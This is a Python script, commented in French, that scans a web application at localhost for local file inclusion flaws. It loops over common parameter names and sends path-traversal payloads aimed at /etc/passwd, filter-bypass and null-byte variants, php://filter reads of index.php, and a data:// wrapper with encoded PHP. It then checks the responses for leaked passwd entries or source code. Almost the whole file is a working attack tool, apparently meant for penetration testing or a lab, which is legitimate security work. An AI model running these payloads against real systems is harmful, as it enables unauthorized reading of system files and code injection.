import requests
import urllib.parse

# URL de base de l'application
BASE_URL = "http://localhost:5000"

def test_lfi(path_param, payload):
    """Teste une charge d'inclusion de fichier local"""
    # Encodage de l'URL pour éviter les problèmes avec les caractères spéciaux
    encoded_payload = urllib.parse.quote(payload)
    url = f"{BASE_URL}/{path_param}={encoded_payload}"
    
    print(f"\n[*] Test avec URL: {url}")
    
    # Envoi de la requête
    response = requests.get(url)
    
    # Analyse de la réponse
    print(f"[+] Code de statut: {response.status_code}")
    print(f"[+] Taille de la réponse: {len(response.text)} caractères")
    
    # Vérification de certains motifs qui pourraient indiquer une LFI réussie
    if "root:" in response.text or "www-data:" in response.text:
        print("[+] SUCCÈS: Possible fuite de /etc/passwd détectée!")
        return True
    elif "<?php" in response.text or "<?=" in response.text:
        print("[+] SUCCÈS: Code source PHP détecté!")
        return True
    elif "error" in response.text.lower() and "include" in response.text.lower():
        print("[+] POSSIBLE: Erreur d'inclusion détectée!")
        return True
    else:
        print("[-] Aucun signe évident de LFI")
        return False

def main():
    print("=== Test de failles LFI (Local File Inclusion) ===")
    
    # Liste des paramètres à tester
    path_params = ["page", "file", "include", "path", "doc", "template"]
    
    # Liste des payloads à tester
    payloads = [
        # Chemins relatifs
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        
        # Contournement de filtres
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
        "../../../etc/passwd%00",  # Null byte (PHP < 5.3.4)
        
        # Wrappers PHP
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="  # <?php phpinfo(); ?>
    ]
    
    # Test de chaque combinaison de paramètre et payload
    successful_tests = []
    
    for param in path_params:
        for payload in payloads:
            if test_lfi(param, payload):
                successful_tests.append((param, payload))
    
    # Résumé
    print("\n=== Résumé des tests ===")
    if successful_tests:
        print(f"[+] {len(successful_tests)} tests ont potentiellement réussi:")
        for i, (param, payload) in enumerate(successful_tests, 1):
            print(f"  {i}. Paramètre: {param}, Payload: {payload}")
    else:
        print("[-] Aucun test n'a réussi ou l'application n'est pas vulnérable aux LFI")

if __name__ == "__main__":
    main() 